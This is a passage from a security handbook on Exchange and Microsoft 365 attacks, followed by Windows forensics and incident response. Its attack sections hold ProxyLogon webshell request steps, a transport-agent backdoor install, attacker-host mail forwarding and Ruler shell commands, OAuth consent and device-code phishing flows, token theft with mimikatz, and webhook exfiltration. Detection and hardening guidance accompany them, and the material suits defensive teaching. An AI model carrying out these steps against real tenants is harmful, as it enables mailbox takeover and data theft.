1. Keep `xp_cmdshell` disabled and audit its enablement.
2. Disable OLE Automation, CLR, and Agent unless required.
3. Use SQL Server Audit to log all configuration changes and privileged operations.
4. Run SQL Server service as a low-privilege gMSA — not as `NT AUTHORITY\SYSTEM` or a domain admin.
5. Remove unnecessary linked servers. Use explicit login mappings (not `sa`) on remaining links.
6. Block outbound SMB from SQL Server hosts at the network level.
7. Restrict who has `sysadmin` role — use role-based access with least privilege.

---

## 5. Exchange and Microsoft 365

### 5.1 Exchange on-premises — expanded

#### 5.1.1 ProxyLogon (CVE-2021-26855 + CVE-2021-27065)

**Mechanism.** ProxyLogon chains two vulnerabilities in Microsoft Exchange Server:

1. **CVE-2021-26855 (SSRF)**: The Exchange Client Access Service (CAS) proxy layer fails to validate the backend target URL. An unauthenticated attacker sends a crafted HTTP request to the CAS front-end, which proxies it to an internal backend service as `NT AUTHORITY\SYSTEM`. This grants the attacker access to Exchange's internal APIs (EWS, PowerShell remoting, OAB, Autodiscover) without authentication.

2. **CVE-2021-27065 (arbitrary file write)**: The Exchange Offline Address Book (OAB) virtual directory allows writing to arbitrary file paths when the attacker can control the `ExternalUrl` parameter. Combined with the SSRF, the attacker writes a webshell (ASPX) to a web-accessible directory.

**Attack chain:**
```
# Step 1: SSRF to obtain admin SID and mailbox info
GET /ecp/y]@domain.local HTTP/1.1
Cookie: X-BEResource=admin@domain.local:443/autodiscover/autodiscover.xml?#~1942062522

# Step 2: Authenticate via SSRF as SYSTEM to obtain admin token
POST /ecp/y]@domain.local HTTP/1.1
Cookie: X-BEResource=admin@domain.local:444/ecp/proxyLogon.ecp#~1942062522
# Body contains admin SID; returns ASP.NET session cookie with admin privileges

# Step 3: Write webshell via OAB virtual directory
POST /ecp/DDI/DDIService.svc/SetObject
# Modify OAB ExternalUrl to include ASPX webshell code
# Exchange writes the webshell to disk
```

**Detection:**
- IIS logs: `POST` to `/ecp/DDI/DDIService.svc/SetObject` from external IPs
- IIS logs: requests with `X-BEResource` cookie containing admin mailbox references
- File creation: new `.aspx` files in `C:\inetpub\wwwroot\aspnet_client\` or Exchange virtual directories
- Event ID 4688: `w3wp.exe` spawning `cmd.exe` or `powershell.exe` (webshell execution)

#### 5.1.2 ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207)

**Mechanism.** Three chained vulnerabilities:
1. **CVE-2021-34473 (pre-auth path confusion)**: URL normalization bypass allows accessing backend Exchange PowerShell without authentication. The path `/autodiscover/autodiscover.json?@evil.com/mapi/nspi` confuses the CAS proxy.
2. **CVE-2021-34523 (privilege escalation)**: The PowerShell backend accepts an `X-Rps-CAT` header that specifies the user context, allowing impersonation of any user.
3. **CVE-2021-31207 (post-auth RCE)**: Mailbox export to a webshell. The attacker exports a mailbox (containing a crafted email with ASPX content) to a `.aspx` file on disk.

```
# Exploitation via ProxyShell-specific tools
# Step 1: obtain legacyDN via autodiscover
# Step 2: obtain SID via MAPI
# Step 3: exchange PowerShell remoting as admin via X-Rps-CAT
# Step 4: export mailbox containing webshell payload to web-accessible path
```

#### 5.1.3 ProxyNotShell (CVE-2022-41040 + CVE-2022-41082)

**Mechanism.** Similar to ProxyShell but requires authentication (a valid mailbox credential):
1. **CVE-2022-41040 (SSRF)**: Authenticated SSRF via the same CAS proxy confusion.
2. **CVE-2022-41082 (RCE)**: Remote code execution via Exchange PowerShell remoting (deserialization).

**Mitigation:** URL rewrite rules blocking `/autodiscover/autodiscover.json` with specific patterns. Patching is the definitive fix.

#### 5.1.4 EWS abuse

```
# EWS — read all emails from a mailbox (with valid credentials or compromised token)
# Python example using exchangelib
from exchangelib import Credentials, Account, DELEGATE
creds = Credentials('domain\\user', 'password')
account = Account('user@domain.com', credentials=creds, autodiscover=True, access_type=DELEGATE)
for item in account.inbox.all().order_by('-datetime_received')[:50]:
    print(item.subject, item.body)

# MailSniper (PowerShell — Exchange recon and attack tool)
Invoke-SelfSearch -Mailbox user@domain.com -ExchHostname mail.domain.com \
  -Terms "password","credentials","vpn"
```

#### 5.1.5 Transport agents and mailbox rules

**Transport agent backdoor:**
```powershell
# After obtaining Exchange admin access
# Install malicious transport agent DLL
Install-TransportAgent -Name "BackdoorAgent" \
  -TransportAgentFactory "Malware.AgentFactory" \
  -AssemblyPath "C:\Exchange\TransportAgents\backdoor.dll"
Enable-TransportAgent -Identity "BackdoorAgent"
Restart-Service MSExchangeTransport
# Agent now processes every email flowing through the server
```

**Mailbox rule persistence:**
```powershell
# Create forwarding rule (attacker has compromised mailbox credentials)
New-InboxRule -Name "UpdateRule" -Mailbox victim@domain.com \
  -ForwardTo attacker@external.com -MarkAsRead $true

# Hidden rule — using MAPI directly (via Ruler tool)
ruler -email victim@domain.com -password pass \
  add -trigger "subject" -name "." \
  -location "\\\\attacker\\webdav\\shell.exe" -send
```

**Detection:**
```powershell
# Audit all mailbox forwarding rules across the organization
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
  Get-InboxRule -Mailbox $_.UserPrincipalName |
    Where-Object { $_.ForwardTo -or $_.ForwardAsAttachmentTo -or $_.RedirectTo }
}
# Check transport agents
Get-TransportAgent | Select Name, Enabled, AssemblyPath
```

### 5.2 Microsoft 365 — expanded

#### 5.2.1 OAuth consent grant attack — detailed

**Attack flow:**
1. Attacker registers a multi-tenant Azure AD app with permissions: `Mail.Read`, `Files.ReadWrite.All`, `User.Read.All`
2. Attacker crafts consent URL:
```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<ATTACKER_APP_ID>&
  redirect_uri=https://attacker.com/callback&
  response_type=code&
  scope=https://graph.microsoft.com/.default&
  state=<random>
```
3. Attacker sends URL to target admin (phishing, Teams message, etc.)
4. Admin clicks, reviews permissions, clicks "Accept"
5. Attacker receives authorization code → exchanges for access + refresh tokens
6. Attacker uses tokens to read email, files, enumerate users — indefinitely (refresh tokens last months)

**Post-exploitation with Graph API:**
```
# Read victim's emails
GET https://graph.microsoft.com/v1.0/me/messages?$top=50
Authorization: Bearer <access_token>

# Search for sensitive content
GET https://graph.microsoft.com/v1.0/me/messages?$search="password OR credential OR vpn"

# Download OneDrive files
GET https://graph.microsoft.com/v1.0/me/drive/root/children
GET https://graph.microsoft.com/v1.0/me/drive/items/<id>/content

# Enumerate all users (if User.Read.All granted)
GET https://graph.microsoft.com/v1.0/users?$select=displayName,mail,userPrincipalName
```

**Detection:**

| Source | Signal | Details |
|--------|--------|---------|
| Azure AD audit log | "Consent to application" | `Activity: Consent to application`, check `TargetResources` for permissions granted |
| Azure AD sign-in log | "Non-interactive sign-in" | App-only sign-ins using the malicious app's client_id |
| Microsoft Cloud App Security | Unusual OAuth app | New app with high-privilege permissions from unknown publisher |

KQL (Sentinel):
```kql
AuditLogs
| where OperationName == "Consent to application"
| extend AppId = tostring(TargetResources[0].id)
| extend Permissions = tostring(TargetResources[0].modifiedProperties)
| where Permissions contains "Mail.Read" or Permissions contains "Files.ReadWrite"
| project TimeGenerated, InitiatedBy, AppId, Permissions
```

**Hardening:**
1. Restrict user consent: `Azure AD → Enterprise Applications → Consent and permissions → User consent settings → Do not allow user consent` (require admin approval for all apps).
2. Configure admin consent workflow.
3. Block consent from external tenants: `Cross-tenant access settings → Default settings → Inbound → Block`.
4. Regularly audit consented applications:
```powershell
Get-AzureADServicePrincipal -All $true |
  Where-Object { $_.PublisherName -ne "Microsoft" } |
  Select-Object DisplayName, AppId, PublisherName, ReplyUrls
```

#### 5.2.2 Device Code phishing — detailed

**Attack flow:**
1. Attacker initiates Device Code flow:
```
POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
Content-Type: application/x-www-form-urlencoded
client_id=<ATTACKER_APP_ID>&scope=https://graph.microsoft.com/.default offline_access
```
Response: `device_code`, `user_code` (e.g., `ABCD-EFGH`), `verification_uri` (`https://microsoft.com/devicelogin`)

2. Attacker sends phishing email: "Please verify your account at https://microsoft.com/devicelogin using code ABCD-EFGH"
3. Victim navigates to legitimate Microsoft URL, enters the code, authenticates (including MFA)
4. Attacker polls for token:
```
POST https://login.microsoftonline.com/common/oauth2/v2.0/token
grant_type=urn:ietf:params:oauth:grant-type:device_code&
client_id=<ATTACKER_APP_ID>&
device_code=<device_code>
```
5. Returns access_token + refresh_token for the victim's account

**Tools:**
```
# TokenTactics (PowerShell)
Get-AzureToken -Client MSGraph -Device  # Initiates device code flow
# Displays user code to send to victim
# Polls automatically until authentication completes

# Roadtools
roadtx device -c <client_id>
roadtx interactiveauth --device-code
```

**Detection:**
- Azure AD sign-in logs: `AuthenticationProtocol: deviceCode`, look for unusual client_ids
- Conditional Access: create a policy blocking Device Code flow for all apps except authorized device-management apps

KQL:
```kql
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| where AppDisplayName !in ("Microsoft Intune", "Azure CLI")
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, Location
```

**Hardening:**
```
# Block Device Code flow via Conditional Access
Azure AD → Security → Conditional Access → New Policy:
  Users: All users
  Cloud apps: All cloud apps
  Conditions → Authentication flows → Device code flow: Block
  Grant: Block access
```

#### 5.2.3 Primary Refresh Token (PRT) extraction

The PRT is a long-lived token stored on Azure AD-joined or hybrid-joined devices. It provides SSO to all Azure AD-integrated applications. If the PRT is stolen, the attacker has persistent access as the user without needing credentials or MFA.

**Attack (from compromised device):**
```
# Mimikatz — extract PRT and session key
mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap
# Output: PRT (JWT), Session Key, Derived Key

# ROADtoken — extract PRT via browser SSO cookie
# Access https://login.microsoftonline.com with the PRT to obtain access tokens

# RequestAADRefreshToken — use the PRT to request new tokens
roadtx prt -k <session_key> --prt <prt_jwt>
roadtx gettokens --prt-cookie <prt_cookie> -r https://graph.microsoft.com
```

**Detection:** Monitor for PRT usage from unexpected devices (device compliance status), PRT usage from IP addresses that don't match the device's known location, and tokens with `deviceid` claims from devices that are not registered.

**Hardening:** Enable Token Protection (Session Token Binding) in Conditional Access — this cryptographically binds tokens to the device, preventing extracted tokens from being used on other devices.

#### 5.2.4 Continuous Access Evaluation (CAE) bypass

CAE allows Azure AD to revoke access tokens in near-real-time (e.g., when a user's session risk changes or their account is disabled). Without CAE, access tokens are valid until their expiration (typically 60–90 minutes).

**Bypass:** Use non-CAE-capable clients (older Office versions, third-party apps that don't implement the CAE claims challenge). The attacker uses a stolen access token with a non-CAE client; even if the admin disables the account, the token remains valid until expiration. Mitigation: enforce CAE-capable clients via Conditional Access; reduce token lifetime.

### 5.3 Teams, SharePoint, and OneDrive attacks

**Teams — tab injection and webhook exfiltration:**
```
# Create a Teams tab pointing to attacker-controlled page (requires Teams admin or user with tab permissions)
POST https://graph.microsoft.com/v1.0/teams/<team-id>/channels/<channel-id>/tabs
Content-Type: application/json
{
  "displayName": "Dashboard",
  "teamsApp@odata.bind": "https://graph.microsoft.com/v1.0/appCatalogs/teamsApps/com.microsoft.teamspace.tab.web",
  "configuration": {
    "contentUrl": "https://attacker.com/phish",
    "entityId": ""
  }
}

# Webhook exfiltration — create incoming webhook
POST https://graph.microsoft.com/v1.0/teams/<team-id>/channels/<channel-id>/incomingWebhook
# Send data to webhook URL:
curl -X POST <webhook_url> -H "Content-Type: application/json" -d '{"text": "exfiltrated data"}'
```

**SharePoint enumeration and data exfiltration:**
```
# List all SharePoint sites
GET https://graph.microsoft.com/v1.0/sites?search=*
Authorization: Bearer <token>

# Browse site contents
GET https://graph.microsoft.com/v1.0/sites/<site-id>/drive/root/children

# Download sensitive files
GET https://graph.microsoft.com/v1.0/sites/<site-id>/drive/items/<item-id>/content

# Search across all SharePoint/OneDrive for sensitive content
GET https://graph.microsoft.com/v1.0/search/query
{
  "requests": [{
    "entityTypes": ["driveItem"],
    "query": { "queryString": "password OR secret OR credential" }
  }]
}
```

**Detection:** Monitor Graph API access patterns — bulk file downloads, search queries for sensitive keywords, and access to sites the user doesn't normally access. Azure AD sign-in logs show which applications and APIs are being accessed.

---

## 6. Windows Forensics and Incident Response

### 6.1 Memory forensics with Volatility3

Memory forensics is the primary method for recovering volatile evidence after a compromise of Windows hosts. Volatility3 operates on raw memory dumps (`.raw`, `.vmem`, `.dmp`) and provides plugins that reconstruct kernel data structures from the image. Acquiring memory can be done with WinPMEM, Belkasoft RAM Capturer, or from hypervisor snapshots (VMware `.vmem`, Hyper-V `.vsv`+`.bin`). For domain controllers and Exchange servers, memory images often exceed 32 GB; ensure the forensic workstation has sufficient storage and that the acquisition tool writes to a separate physical disk to avoid evidence contamination.

**Process enumeration and anomaly detection.** The `windows.pslist` plugin walks the `EPROCESS` doubly-linked list (the same list described in §2.1). Rootkits that unlink processes from this list (DKOM) are detected by cross-referencing against `windows.psscan`, which scans physical memory for `EPROCESS` pool tags regardless of list membership.

```bash
# Enumerate processes via EPROCESS linked list
python3 vol.py -f memory.raw windows.pslist

# Scan for hidden/unlinked processes (DKOM detection)
python3 vol.py -f memory.raw windows.psscan

# Compare pslist vs psscan — hidden processes appear only in psscan
python3 vol.py -f memory.raw windows.psscan | grep -v "$(python3 vol.py -f memory.raw windows.pslist | awk '{print $1}')"
```

**Detecting injected code and hollowed processes.** `windows.malfind` identifies private memory regions with executable permissions (PAGE_EXECUTE_READWRITE) that are not backed by a file on disk. This is the signature of reflective DLL injection, process hollowing, and shellcode injection (Domain 11 Chapter 11A §1). The plugin dumps the suspicious memory region for further analysis with YARA or manual disassembly.

```bash
# Detect injected code regions (PE headers in private memory, RWX regions)
python3 vol.py -f memory.raw windows.malfind

# Dump the injected code to disk for offline analysis
python3 vol.py -f memory.raw windows.malfind --dump --pid 4728
```

**Credential extraction from memory.** When LSASS was not protected by Credential Guard at the time of compromise, the memory image contains credential material that can be extracted offline. This avoids triggering EDR on the live system and provides a forensic record of which credentials were exposed.

```bash
# Extract LSA secrets and cached credentials
python3 vol.py -f memory.raw windows.lsadump

# Extract registry hives from memory for offline cracking
python3 vol.py -f memory.raw windows.registry.hivelist
python3 vol.py -f memory.raw windows.hashdump
```

**Handle analysis.** Open handles reveal which files, registry keys, named pipes, and tokens a process held at capture time. For incident response, this exposes persistence mechanisms (files held open by a backdoor), data staging (handles to sensitive files), and lateral movement channels (named pipe handles used for impersonation as described in §2.4).

```bash
# List handles for a specific process
python3 vol.py -f memory.raw windows.handles --pid 4728

# Filter for file handles to find data staging
python3 vol.py -f memory.raw windows.handles --pid 4728 | grep "File"

# Filter for key handles to detect registry persistence
python3 vol.py -f memory.raw windows.handles --pid 4728 | grep "Key"
```

**Network connection reconstruction.** `windows.netscan` recovers TCP/UDP connection state from pool-tagged structures. This captures connections that may have already terminated by the time disk-based logs are reviewed, including C2 callbacks, lateral movement sessions, and data exfiltration channels.

```bash
# Recover network connections (active and recently closed)
python3 vol.py -f memory.raw windows.netscan

# Filter for connections from suspicious processes
python3 vol.py -f memory.raw windows.netscan | grep -E "(powershell|cmd|rundll32|w3wp)"

# Filter for external connections (non-RFC1918)
python3 vol.py -f memory.raw windows.netscan | grep -vE "(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)"
```

**DLL analysis.** Attackers frequently side-load malicious DLLs or inject them into legitimate processes. `windows.dlllist` shows the loaded modules for each process, while `windows.modules` enumerates kernel-mode drivers. Comparing loaded DLLs against known-good baselines reveals injected or side-loaded libraries.

```bash
# List DLLs loaded by a specific process
python3 vol.py -f memory.raw windows.dlllist --pid 4728

# List all kernel drivers (detect rootkit drivers)
python3 vol.py -f memory.raw windows.modules

# Dump a suspicious DLL from process memory
python3 vol.py -f memory.raw windows.dlllist --pid 4728 --dump
```

### 6.2 Registry forensics

The Windows registry records execution history, persistence mechanisms, and configuration changes that are invaluable for incident response. Registry hives can be acquired from a live system (`reg save`), from a forensic disk image, or extracted from memory with Volatility3's `windows.registry.hivelist` and `windows.registry.printkey`. Offline analysis uses RegRipper, Eric Zimmerman's RECmd, or Registry Explorer.

**ShimCache (AppCompatCache).** Located at `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache`, ShimCache records metadata about executables that were loaded (and sometimes merely looked up) by the application compatibility subsystem. Entries include the full file path, the last-modified timestamp of the file, and (on older Windows versions) an executed flag. ShimCache is written to the registry only at shutdown, so entries from the current boot session exist only in memory until the system shuts down.

```bash
# Parse ShimCache from a SYSTEM hive
python3 AppCompatCacheParser.py -f SYSTEM --csv output/ -t

# RegRipper plugin
rip.exe -r SYSTEM -p shimcache

# RECmd (Eric Zimmerman)
RECmd.exe -f SYSTEM --kn "ControlSet001\Control\Session Manager\AppCompatCache" --csv output/
```

**Amcache.** `C:\Windows\appcompat\Programs\Amcache.hve` is a registry hive that records detailed information about program execution: file path, SHA1 hash, PE compilation timestamp, publisher, and first execution time. Unlike ShimCache, Amcache records entries at execution time rather than at shutdown, making it more reliable for establishing that a binary was actually run.

```bash
# Parse Amcache
AmcacheParser.exe -f Amcache.hve --csv output/ -i

# RegRipper
rip.exe -r Amcache.hve -p amcache
```

**BAM/DAM (Background Activity Moderator / Desktop Activity Moderator).** Located at `HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\{SID}`, BAM records the last execution time and path of executables run by each user. Available since Windows 10 1709. DAM (`dam\State\UserSettings`) records similar data. These artifacts provide per-user execution evidence with timestamps.

```bash
# RegRipper
rip.exe -r SYSTEM -p bam

# RECmd
RECmd.exe -f SYSTEM --kn "ControlSet001\Services\bam\State\UserSettings" --csv output/
```

**UserAssist.** Stored at `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count`, UserAssist records GUI-based program executions per user. Values are ROT13-encoded. Each entry includes the run count, last execution time, and focus time. Useful for proving user interaction (as opposed to automated/service execution).

```bash
# RegRipper
rip.exe -r NTUSER.DAT -p userassist

# RECmd
RECmd.exe -f NTUSER.DAT --kn "Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" --csv output/
```

### 6.3 Event log forensics

Windows event logs are the authoritative audit trail for security investigations. The following event IDs form the core forensic dataset. All logs reside under `C:\Windows\System32\winevt\Logs\` and can be parsed with `Get-WinEvent`, `EvtxECmd` (Eric Zimmerman), `evtx_dump` (Rust tool), or ingested into a SIEM.

**Authentication and logon events (Security log).**

| Event ID | Description | Forensic significance |
|----------|-------------|----------------------|
| 4624 | Successful logon | Logon Type reveals method: 2 (interactive), 3 (network), 7 (unlock), 9 (NewCredentials/RunAs), 10 (RemoteInteractive/RDP) |
| 4625 | Failed logon | Brute force detection, password spray patterns, invalid account enumeration |
| 4648 | Explicit credential logon | `runas`, `PsExec`, Mimikatz `sekurlsa::pth` — attacker using captured credentials |
| 4672 | Special privilege logon | `SeDebugPrivilege`, `SeBackupPrivilege`, `SeImpersonatePrivilege` assigned to new logon |
| 4688 | Process creation | Requires "Audit Process Creation" policy + command-line auditing. Records parent PID, command line, token info |
| 4697 | Service installed | Persistence via new services — correlate with Sysmon Event ID 13 (registry) |
| 4768 | Kerberos TGT requested (AS-REQ) | Pre-auth failures (error 0x18) indicate password spray; see Domain 14A §4 |
| 4769 | Kerberos service ticket (TGS-REQ) | Kerberoasting detection: RC4 encryption (0x17) requests for SPNs; see Domain 14A §5 |

```powershell
# Query logon events for a specific timeframe
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4624
    StartTime = '2026-01-15T00:00:00'
    EndTime = '2026-01-16T00:00:00'
} | Select-Object TimeCreated,
    @{N='LogonType';E={$_.Properties[8].Value}},
    @{N='TargetUser';E={$_.Properties[5].Value}},
    @{N='SourceIP';E={$_.Properties[18].Value}}

# Detect potential password spray (many 4625 events, distinct usernames, same source)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} |
    Group-Object {$_.Properties[19].Value} |
    Where-Object { $_.Count -gt 20 } |
    Select-Object Name, Count
```

**PowerShell logging (Microsoft-Windows-PowerShell/Operational).**

| Event ID | Description | Forensic significance |
|----------|-------------|----------------------|
| 4103 | Module logging | Records full pipeline execution output including cmdlet parameters |
| 4104 | Script block logging | Captures the full text of every PowerShell script block executed, including decoded/deobfuscated content |

Script block logging is critical because PowerShell-based attack tools (Invoke-Mimikatz, PowerView, Rubeus) are captured in full, even if the script was invoked via `IEX(New-Object Net.WebClient).DownloadString()` or encoded with `-enc`. AMSI deobfuscation feeds into 4104, so even multi-layer-encoded payloads are logged in cleartext.

```powershell
# Enable enhanced PowerShell logging via GPO
# Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell:
#   "Turn on Module Logging" → Enabled, module names: *
#   "Turn on Script Block Logging" → Enabled

# Search for suspicious script blocks
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
    Where-Object { $_.Message -match 'Invoke-Mimikatz|Invoke-Kerberoast|Invoke-SharpHound|IEX|DownloadString|FromBase64String' } |
    Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}}
```

**WMI persistence events (Microsoft-Windows-WMI-Activity/Operational).**

| Event ID | Description | Forensic significance |
|----------|-------------|----------------------|
| 5857 | WMI provider loaded | Provider DLL loads — detect malicious WMI providers |
| 5858 | WMI query error | Failed queries during reconnaissance |
| 5859 | WMI provider registration | New provider registration — persistence mechanism |
| 5860 | WMI temporary event registration | Temporary event subscriptions (often used for execution triggers) |
| 5861 | WMI permanent event registration | Permanent event subscriptions — the primary WMI persistence technique |

WMI event subscriptions (Event ID 5861) are a high-fidelity persistence indicator. The event records the filter query, the consumer (usually a `CommandLineEventConsumer` or `ActiveScriptEventConsumer`), and the binding. A legitimate environment has very few permanent WMI event subscriptions; any new one warrants investigation.

**Log clearing detection.** Event ID 1102 (Security log cleared) in the Security log is written before the log is purged. Event ID 104 in the System log records any event log being cleared. These are high-confidence indicators of evidence tampering.

```powershell
# Detect log clearing
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102}
Get-WinEvent -FilterHashtable @{LogName='System'; Id=104}
```

### 6.4 Exchange forensics

**Mailbox rule persistence detection.** Attackers who compromise Exchange mailboxes frequently create forwarding rules (§5.1.5) that survive password resets and MFA enrollment. Forensic review must enumerate all inbox rules across the organization and identify rules created during the compromise window.

```powershell
# Comprehensive mailbox rule audit
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $mbx = $_.UserPrincipalName
    Get-InboxRule -Mailbox $mbx | Where-Object {
        $_.ForwardTo -or $_.ForwardAsAttachmentTo -or
        $_.RedirectTo -or $_.DeleteMessage -eq $true
    } | Select-Object @{N='Mailbox';E={$mbx}}, Name, ForwardTo,
        ForwardAsAttachmentTo, RedirectTo, DeleteMessage, IsEnabled
} | Export-Csv -Path "C:\forensics\mailbox_rules.csv" -NoTypeInformation

# Check for hidden rules (rules with non-printable characters in name)
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    Get-InboxRule -Mailbox $_.UserPrincipalName -IncludeHidden
}
```

**Transport agent DLL analysis.** Malicious transport agents (§5.1.5) process every email flowing through the Exchange server. During incident response, enumerate installed agents and verify each DLL against known-good baselines. The DLL should be submitted to a sandbox and analyzed for suspicious imports (`System.Net.Sockets`, `System.Diagnostics.Process`, `System.IO.File`).

```powershell
# Enumerate transport agents and their assemblies
Get-TransportAgent | Select-Object Identity, Enabled, AssemblyPath, Priority |
    Format-Table -AutoSize

# Hash each agent DLL for IOC matching
Get-TransportAgent | ForEach-Object {
    $hash = Get-FileHash -Path $_.AssemblyPath -Algorithm SHA256
    [PSCustomObject]@{
        Agent = $_.Identity
        Path  = $_.AssemblyPath
        SHA256 = $hash.Hash
    }
}
```

**OWA IIS log analysis.** Outlook Web App runs under IIS, and the IIS access logs (`C:\inetpub\logs\LogFiles\W3SVC1\` or the Exchange-specific virtual directory logs) capture every HTTP request. ProxyLogon, ProxyShell, and ProxyNotShell exploitation leaves distinctive patterns in these logs. Look for POST requests to `/ecp/DDI/DDIService.svc/SetObject`, requests with `X-BEResource` cookies (ProxyLogon), requests to `/autodiscover/autodiscover.json` with anomalous query strings (ProxyShell/ProxyNotShell), and POST requests to ASPX files that appeared recently on disk (webshell callbacks).

```powershell
# Search IIS logs for ProxyLogon indicators
Select-String -Path "C:\inetpub\logs\LogFiles\W3SVC1\*.log" -Pattern "DDIService.svc/SetObject|proxyLogon.ecp|X-BEResource"

# Search for ProxyShell indicators
Select-String -Path "C:\inetpub\logs\LogFiles\W3SVC1\*.log" -Pattern "autodiscover\.json.*mapi/nspi|autodiscover\.json.*powershell"

# Find webshell access patterns (POST to .aspx in unusual directories)
Select-String -Path "C:\inetpub\logs\LogFiles\W3SVC1\*.log" -Pattern "POST.*/aspnet_client/.*\.aspx"
```

**M365 Unified Audit Log (UAL) analysis.** For M365 incidents, the Unified Audit Log provides the authoritative record of mailbox access, file operations, admin actions, and application consent. UAL retention is 90 days for E3 and 365 days for E5 (with Audit Premium). Critical audit actions include `MailItemsAccessed` (every mailbox read), `FileAccessed`/`FileDownloaded` (SharePoint/OneDrive), `Consent to application` (OAuth grants), and `Add delegated permission grant` (application permission changes).

```powershell
# Search UAL for mailbox access during compromise window
Search-UnifiedAuditLog -StartDate "2026-01-15" -EndDate "2026-01-20" `
    -RecordType ExchangeItem -Operations MailItemsAccessed `
    -ResultSize 5000 | Export-Csv "C:\forensics\mailbox_access.csv" -NoTypeInformation

# Search for OAuth consent events
Search-UnifiedAuditLog -StartDate "2026-01-15" -EndDate "2026-01-20" `
    -Operations "Consent to application" `
    -ResultSize 5000 | Select-Object CreationDate, UserIds, Operations, AuditData
```

### 6.5 SQL Server forensics

**xp_cmdshell detection.** When `xp_cmdshell` is enabled and executed (§4.2), the SQL Server error log records the configuration change. Extended Events or SQL Server Audit captures the actual commands. On the OS side, `cmd.exe` or `powershell.exe` spawned by `sqlservr.exe` is the canonical indicator (Sysmon Event ID 1 / Security Event ID 4688).

```sql
-- Query SQL Server error log for configuration changes
EXEC xp_readerrorlog 0, 1, 'xp_cmdshell';
EXEC xp_readerrorlog 0, 1, 'Configuration option';

-- Create Extended Events session to capture xp_cmdshell
CREATE EVENT SESSION [XPCmdShellAudit] ON SERVER
ADD EVENT sqlserver.rpc_completed(
    WHERE ([sqlserver].[like_i_sql_unicode_string]([statement], N'%xp_cmdshell%'))
),
ADD EVENT sqlserver.sql_batch_completed(
    WHERE ([sqlserver].[like_i_sql_unicode_string]([batch_text], N'%xp_cmdshell%'))
)
ADD TARGET package0.event_file(SET filename = N'C:\audit\xpcmdshell.xel')
WITH (STARTUP_STATE = ON);
ALTER EVENT SESSION [XPCmdShellAudit] ON SERVER STATE = START;
```

**Linked server abuse detection.** Linked server queries (§4.3) that chain through multiple servers leave traces in each server's audit log. The key indicator is `OPENQUERY` nesting or `EXEC ... AT [LINKED_SERVER]` executing commands on remote instances.

```sql
-- Audit linked server usage via Extended Events
CREATE EVENT SESSION [LinkedServerAudit] ON SERVER
ADD EVENT sqlserver.oledb_query_interface,
ADD EVENT sqlserver.sql_batch_completed(
    WHERE ([sqlserver].[like_i_sql_unicode_string]([batch_text], N'%OPENQUERY%')
        OR [sqlserver].[like_i_sql_unicode_string]([batch_text], N'%AT [%'))
)
ADD TARGET package0.event_file(SET filename = N'C:\audit\linkedserver.xel')
WITH (STARTUP_STATE = ON);
```

**SQL Agent job persistence.** Attackers create SQL Agent jobs (§4.2) that execute operating system commands on a schedule. Enumerate all Agent jobs and inspect their steps for suspicious commands (`powershell`, `cmd`, encoded payloads, network connections).

```sql
-- Enumerate all SQL Agent jobs and their command steps
SELECT j.name AS JobName, j.enabled, j.date_created, j.date_modified,
       s.step_name, s.subsystem, s.command
FROM msdb.dbo.sysjobs j
JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id
WHERE s.subsystem IN ('CmdExec', 'PowerShell')
ORDER BY j.date_created DESC;
```

### 6.6 Incident response runbook

The following phased runbook applies to compromises involving Windows hosts, Exchange servers, and M365 tenants. Each phase has specific actions and evidence-preservation requirements.

**Phase 1 — Containment.** The immediate goal is to stop active attacker operations without destroying volatile evidence. Isolate compromised hosts at the network level (VLAN change, host firewall, or EDR network isolation) rather than powering off — powering off destroys memory contents. For Exchange servers, block external access to CAS endpoints (`/owa`, `/ecp`, `/autodiscover`, `/mapi`, `/rpc`, `/ews`) at the load balancer or WAF while preserving the IIS worker processes for memory acquisition. For M365 compromises, revoke all active sessions and refresh tokens for affected accounts, disable compromised OAuth applications, and block the attacker's IP addresses in Conditional Access.

```powershell
# Network isolation via Windows Firewall (preserve system for forensics)
New-NetFirewallRule -DisplayName "IR-Isolate" -Direction Outbound -Action Block `
    -RemoteAddress "0.0.0.0/0" -Profile Any
New-NetFirewallRule -DisplayName "IR-AllowForensics" -Direction Inbound -Action Allow `
    -RemoteAddress "10.0.50.0/24" -Profile Any  # forensics workstation subnet

# Revoke M365 sessions
Revoke-AzureADUserAllRefreshToken -ObjectId "<user-object-id>"
# Disable compromised enterprise app
Set-AzureADApplication -ObjectId "<app-object-id>" -AvailableToOtherTenants $false
```

**Phase 2 — Evidence collection.** Acquire evidence in order of volatility: memory first, then disk images, then logs, then network captures. For each evidence source, document the acquisition time (UTC ISO 8601), method, and hash of the acquired artifact.

```bash
# Memory acquisition with WinPMEM
winpmem_mini_x64.exe memory.raw
# Hash the acquired image
certutil -hashfile memory.raw SHA256 > memory.raw.sha256

# Disk image with FTK Imager CLI
ftkimager.exe \\.\PhysicalDrive0 C:\evidence\disk --e01 --compress 6
```

**Phase 3 — Analysis.** Apply the forensic techniques from §6.1–§6.5 to the collected evidence. Correlate findings across memory, registry, event logs, and application-specific logs. Build a timeline using tools like `log2timeline`/`plaso` that merge all evidence sources into a single chronological view.

```bash
# Create a super timeline with plaso
log2timeline.py --storage-file timeline.plaso /evidence/disk.E01
psort.py --output-time-zone UTC -o l2tcsv timeline.plaso > timeline.csv

# Filter the timeline for the compromise window
